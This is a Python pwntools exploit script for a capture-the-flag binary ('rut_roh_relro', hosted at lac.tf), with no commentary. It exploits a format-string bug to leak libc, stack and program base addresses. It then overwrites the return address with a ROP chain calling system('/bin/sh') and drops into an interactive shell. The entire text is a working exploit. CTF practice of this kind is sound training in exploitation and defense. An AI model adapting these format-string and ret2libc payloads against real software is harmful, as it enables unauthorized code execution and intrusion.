#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("rut_roh_relro_patched")
libc = ELF("./libc-2.31.so")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "lac.tf", "31134"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# leak libc, stack & prog base
sla('post?\n', '%3$p.%68$p.%70$p.')
libc.address = int(rcu('post:\n','.'),16)-0xec833
logbase()
stack = int(p.recvuntil('.',drop=True),16)
logleak('stack',stack)
exe.address = int(p.recvuntil('.',drop=True),16)-0x1220
logleak('prog base', exe.address)

rop = ROP(libc)
onegadgets = one_gadget(libc.path, libc.address)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# write ROP on stack return address
payload = p64(pop_rdi)+p64(next(libc.search('/bin/sh')))+p64(libc.sym['system'])
sla('post?\n', fmtstr_payload(6, {(stack-0xe8): payload}))

p.interactive()

